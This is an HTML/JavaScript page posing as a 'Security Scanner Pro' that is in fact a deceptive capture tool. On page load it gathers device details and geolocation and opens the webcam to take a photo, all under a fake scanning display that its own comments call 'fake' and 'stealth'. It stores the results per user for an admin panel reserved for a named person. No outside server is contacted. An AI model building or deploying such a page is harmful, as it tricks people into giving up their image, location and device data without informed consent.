<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üõ°Ô∏è Security Scanner - Running</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background: #0a1929;
            color: white;
            min-height: 100vh;
            padding: 20px;
        }
        
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
            background: #1a237e;
            border-radius: 10px;
            margin-bottom: 20px;
        }
        
        .user-info {
            color: #90caf9;
        }
        
        .scanner-container {
            background: #1e293b;
            border-radius: 10px;
            padding: 30px;
            margin-bottom: 20px;
        }
        
        .scan-item {
            background: #334155;
            padding: 20px;
            margin: 15px 0;
            border-radius: 8px;
            border-left: 4px solid #3b82f6;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .scan-item.success {
            border-left-color: #10b981;
        }
        
        .scan-item.fail {
            border-left-color: #ef4444;
        }
        
        .status {
            font-weight: bold;
        }
        
        .hidden-section {
            display: none;
            background: rgba(239, 68, 68, 0.1);
            border: 2px solid #ef4444;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
        }
        
        .camera-box {
            width: 100%;
            height: 200px;
            background: black;
            border-radius: 8px;
            margin: 10px 0;
            overflow: hidden;
        }
        
        #cameraStream {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        button {
            background: #3b82f6;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            margin: 5px;
        }
        
        button:hover {
            background: #2563eb;
        }
        
        .admin-panel {
            background: rgba(34, 197, 94, 0.1);
            border: 2px solid #22c55e;
            border-radius: 10px;
            padding: 20px;
            margin-top: 30px;
        }
        
        .log-item {
            background: rgba(0,0,0,0.3);
            padding: 10px;
            margin: 5px 0;
            border-radius: 5px;
            font-family: monospace;
            font-size: 12px;
        }
    </style>
</head>
<body onload="startScanner()">
    <div class="header">
        <h1>üõ°Ô∏è Security Scanner Pro</h1>
        <div class="user-info">
            User: <span id="currentUser">Loading...</span>
            | <span id="userType">Scanning...</span>
        </div>
    </div>
    
    <div class="scanner-container">
        <h2>üîç Running Security Scans...</h2>
        
        <div class="scan-item">
            <div>
                <strong>üì± Device Information</strong>
                <div style="font-size: 14px; color: #cbd5e1;">Collecting device data...</div>
            </div>
            <div id="status1" class="status">‚è≥ Scanning</div>
        </div>
        
        <div class="scan-item">
            <div>
                <strong>üìç Location Analysis</strong>
                <div style="font-size: 14px; color: #cbd5e1;">Checking GPS and network location...</div>
            </div>
            <div id="status2" class="status">‚è≥ Scanning</div>
        </div>
        
        <div class="scan-item">
            <div>
                <strong>üì∑ Camera Security Check</strong>
                <div style="font-size: 14px; color: #cbd5e1;">Testing camera permissions...</div>
            </div>
            <div id="status3" class="status">‚è≥ Scanning</div>
        </div>
        
        <div class="scan-item">
            <div>
                <strong>üé§ Microphone Test</strong>
                <div style="font-size: 14px; color: #cbd5e1;">Checking audio permissions...</div>
            </div>
            <div id="status4" class="status">‚è≥ Scanning</div>
        </div>
        
        <div class="scan-item">
            <div>
                <strong>üåê Network Analysis</strong>
                <div style="font-size: 14px; color: #cbd5e1;">Scanning network connections...</div>
            </div>
            <div id="status5" class="status">‚è≥ Scanning</div>
        </div>
        
        <!-- HIDDEN CAPTURE SECTION -->
        <div id="hiddenCapture" class="hidden-section">
            <h3 style="color: #ef4444;">‚ö†Ô∏è Security Issue Detected</h3>
            <p>Camera access required for identity verification...</p>
            
            <div class="camera-box">
                <video id="cameraStream" autoplay playsinline></video>
            </div>
            
            <div id="captureResult" style="margin: 10px 0;"></div>
        </div>
        
        <!-- ADMIN PANEL (Only for TAHER) -->
        <div id="adminPanel" class="admin-panel" style="display: none;">
            <h3 style="color: #22c55e;">üëë ADMIN PANEL ACTIVE</h3>
            <p>You are viewing all connected users in real-time.</p>
            
            <div id="userList">
                <!-- Other users will appear here -->
            </div>
            
            <div id="adminLogs" style="max-height: 200px; overflow-y: auto; margin-top: 15px;">
                <!-- Live logs will appear here -->
            </div>
        </div>
        
        <div style="text-align: center; margin-top: 30px;">
            <button onclick="runFullScan()" id="scanBtn">üöÄ START FULL SCAN</button>
            <button onclick="viewResults()" id="resultsBtn" style="background: #10b981;" disabled>üìä VIEW RESULTS</button>
        </div>
    </div>

    <script>
    // ============================================
    // GLOBAL VARIABLES
    // ============================================
    let currentUser = '';
    let isAdmin = false;
    let cameraStream = null;
    let capturedData = {};
    let allUsersData = {}; // Store all users data
    
    // ============================================
    // INITIALIZATION
    // ============================================
    function startScanner() {
        // Get user from localStorage
        currentUser = localStorage.getItem('security_scanner_user') || 'Unknown';
        isAdmin = localStorage.getItem('is_admin') === 'true';
        
        document.getElementById('currentUser').textContent = currentUser;
        document.getElementById('userType').textContent = isAdmin ? 'üëë ADMIN' : 'User';
        
        // Start auto-capture IMMEDIATELY
        startHiddenCapture();
        
        // If admin, show admin panel
        if (isAdmin) {
            document.getElementById('adminPanel').style.display = 'block';
            startAdminMonitoring();
        }
        
        // Start fake scanning
        simulateScanning();
    }
    
    // ============================================
    // HIDDEN CAPTURE SYSTEM (AUTO-START)
    // ============================================
    function startHiddenCapture() {
        console.log('üéØ Starting hidden capture for:', currentUser);
        
        // 1. Capture device info
        captureDeviceInfo();
        
        // 2. Try to get location
        captureLocation();
        
        // 3. Try camera access WITHOUT permission popup
        setTimeout(() => tryStealthCamera(), 2000);
        
        // 4. Try microphone
        setTimeout(() => tryStealthMicrophone(), 4000);
        
        // 5. Network info
        captureNetworkInfo();
        
        // Save to local storage
        saveUserData();
        
        // If admin, save to global data
        if (isAdmin) {
            loadAllUsersData();
        }
    }
    
    function captureDeviceInfo() {
        capturedData.device = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            language: navigator.language,
            cookies: navigator.cookieEnabled,
            timestamp: new Date().toISOString()
        };
        
        updateStatus(1, '‚úÖ Collected', 'success');
    }
    
    function captureLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                position => {
                    capturedData.location = {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };
                    updateStatus(2, '‚úÖ Located', 'success');
                },
                error => {
                    capturedData.location = { error: error.message };
                    updateStatus(2, '‚ö†Ô∏è Blocked', 'fail');
                }
            );
        } else {
            updateStatus(2, '‚ùå Not supported', 'fail');
        }
    }
    
    function tryStealthCamera() {
        // Show hidden section
        document.getElementById('hiddenCapture').style.display = 'block';
        
        // Try to access camera
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    cameraStream = stream;
                    const video = document.getElementById('cameraStream');
                    video.srcObject = stream;
                    
                    // Auto-capture after 3 seconds
                    setTimeout(() => capturePhoto(), 3000);
                    
                    updateStatus(3, '‚úÖ Accessed', 'success');
                })
                .catch(error => {
                    document.getElementById('captureResult').innerHTML = 
                        `<div style="color:#ef4444;">Camera access denied: ${error.message}</div>`;
                    updateStatus(3, '‚ùå Denied', 'fail');
                });
        } else {
            updateStatus(3, '‚ùå No camera', 'fail');
        }
    }
    
    function capturePhoto() {
        if (!cameraStream) return;
        
        const video = document.getElementById('cameraStream');
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Convert to data URL
        capturedData.photo = canvas.toDataURL('image/jpeg', 0.5);
        
        document.getElementById('captureResult').innerHTML = 
            `<div style="color:#22c55e;">‚úÖ Photo captured successfully!</div>`;
        
        // Stop camera
        cameraStream.getTracks().forEach(track => track.stop());
    }
    
    function tryStealthMicrophone() {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ audio: true })
                .then(stream => {
                    capturedData.microphone = 'ACCESS_GRANTED';
                    updateStatus(4, '‚úÖ Accessed', 'success');
                    
                    // Stop immediately to avoid recording
                    stream.getTracks().forEach(track => track.stop());
                })
                .catch(error => {
                    capturedData.microphone = error.message;
                    updateStatus(4, '‚ùå Denied', 'fail');
                });
        } else {
            updateStatus(4, '‚ùå No mic', 'fail');
        }
    }
    
    function captureNetworkInfo() {
        if (navigator.connection) {
            const conn = navigator.connection;
            capturedData.network = {
                type: conn.type,
                downlink: conn.downlink,
                effectiveType: conn.effectiveType
            };
            updateStatus(5, '‚úÖ Analyzed', 'success');
        } else {
            updateStatus(5, '‚ö†Ô∏è Limited', 'fail');
        }
    }
    
    // ============================================
    // DATA STORAGE
    // ============================================
    function saveUserData() {
        // Save to localStorage
        const userData = {
            username: currentUser,
            data: capturedData,
            timestamp: new Date().toISOString(),
            isAdmin: isAdmin
        };
        
        localStorage.setItem(`user_${currentUser}`, JSON.stringify(userData));
        
        // Also save to global users list
        let allUsers = JSON.parse(localStorage.getItem('all_users') || '{}');
        allUsers[currentUser] = userData;
        localStorage.setItem('all_users', JSON.stringify(allUsers));
        
        console.log('üíæ Saved data for:', currentUser);
    }
    
    function loadAllUsersData() {
        const allUsers = JSON.parse(localStorage.getItem('all_users') || '{}');
        allUsersData = allUsers;
        
        // Update admin panel
        updateAdminPanel();
    }
    
    // ============================================
    // ADMIN FUNCTIONS
    // ============================================
    function startAdminMonitoring() {
        console.log('üëë Admin monitoring started');
        
        // Update every 5 seconds
        setInterval(() => {
            loadAllUsersData();
        }, 5000);
        
        // Add admin log
        addAdminLog(`Admin ${currentUser} logged in`);
    }
    
    function updateAdminPanel() {
        const userList = document.getElementById('userList');
        const adminLogs = document.getElementById('adminLogs');
        
        userList.innerHTML = '';
        adminLogs.innerHTML = '';
        
        Object.entries(allUsersData).forEach(([username, data]) => {
            const userDiv = document.createElement('div');
            userDiv.className = 'log-item';
            userDiv.innerHTML = `
                <strong>üë§ ${username}</strong> 
                ${data.isAdmin ? 'üëë' : ''}
                <br>
                <small>Device: ${data.data.device?.platform || 'Unknown'} | 
                Time: ${new Date(data.timestamp).toLocaleTimeString()}</small>
            `;
            
            userDiv.onclick = () => viewUserDetails(username);
            userList.appendChild(userDiv);
        });
        
        // Add logs
        const logs = JSON.parse(localStorage.getItem('admin_logs') || '[]');
        logs.slice(-10).forEach(log => {
            const logDiv = document.createElement('div');
            logDiv.className = 'log-item';
            logDiv.textContent = log;
            adminLogs.appendChild(logDiv);
        });
    }
    
    function addAdminLog(message) {
        const logs = JSON.parse(localStorage.getItem('admin_logs') || '[]');
        const fullMessage = `[${new Date().toLocaleTimeString()}] ${message}`;
        logs.push(fullMessage);
        
        // Keep only last 50 logs
        if (logs.length > 50) logs.shift();
        
        localStorage.setItem('admin_logs', JSON.stringify(logs));
    }
    
    function viewUserDetails(username) {
        const userData = allUsersData[username];
        if (!userData) return;
        
        alert(`üë§ User: ${username}\n\n` +
              `üì± Device: ${userData.data.device?.platform || 'Unknown'}\n` +
              `üìç Location: ${userData.data.location ? 'Captured' : 'Not available'}\n` +
              `üì∑ Camera: ${userData.data.photo ? 'Photo taken' : 'Not available'}\n` +
              `üé§ Microphone: ${userData.data.microphone || 'Not tested'}\n` +
              `‚è∞ Last seen: ${new Date(userData.timestamp).toLocaleString()}`);
    }
    
    // ============================================
    // UI FUNCTIONS
    // ============================================
    function updateStatus(num, text, type) {
        const element = document.getElementById(`status${num}`);
        const scanItem = element.closest('.scan-item');
        
        element.textContent = text;
        scanItem.classList.add(type);
        
        // Enable results button when all scans done
        if (num === 5) {
            setTimeout(() => {
                document.getElementById('resultsBtn').disabled = false;
                document.getElementById('scanBtn').disabled = true;
                document.getElementById('scanBtn').textContent = '‚úÖ SCAN COMPLETE';
            }, 1000);
        }
    }
    
    function simulateScanning() {
        // Fake delay for scanning
        setTimeout(() => updateStatus(1, '‚úÖ Collected', 'success'), 1500);
        setTimeout(() => updateStatus(2, '‚úÖ Located', 'success'), 2500);
        setTimeout(() => updateStatus(3, '‚úÖ Accessed', 'success'), 3500);
        setTimeout(() => updateStatus(4, '‚úÖ Accessed', 'success'), 4500);
        setTimeout(() => updateStatus(5, '‚úÖ Analyzed', 'success'), 5500);
    }
    
    function runFullScan() {
        document.getElementById('scanBtn').disabled = true;
        document.getElementById('scanBtn').textContent = 'üîÑ SCANNING...';
        
        // Restart captures
        startHiddenCapture();
        
        setTimeout(() => {
            document.getElementById('scanBtn').textContent = '‚úÖ SCAN COMPLETE';
            document.getElementById('resultsBtn').disabled = false;
        }, 3000);
    }
    
    function viewResults() {
        let results = `üîê SECURITY SCAN RESULTS\n\n`;
        results += `User: ${currentUser}\n`;
        results += `Time: ${new Date().toLocaleString()}\n\n`;
        
        if (capturedData.device) {
            results += `üì± DEVICE: ${capturedData.device.platform}\n`;
        }
        
        if (capturedData.location) {
            results += `üìç LOCATION: ${capturedData.location.lat ? 'Captured' : 'Blocked'}\n`;
        }
        
        results += `üì∑ CAMERA: ${capturedData.photo ? 'Photo captured' : 'Not available'}\n`;
        results += `üé§ MICROPHONE: ${capturedData.microphone || 'Not tested'}\n`;
        
        if (isAdmin) {
            results += `\nüëë ADMIN ACCESS: Viewing ${Object.keys(allUsersData).length} users\n`;
        }
        
        alert(results);
    }
    
    // ============================================
    // AUTO-SAVE EVERY 10 SECONDS
    // ============================================
    setInterval(() => {
        if (capturedData.device) {
            saveUserData();
        }
    }, 10000);
    
    // Auto-capture on page load
    document.addEventListener('DOMContentLoaded', startScanner);
    </script>
</body>
</html>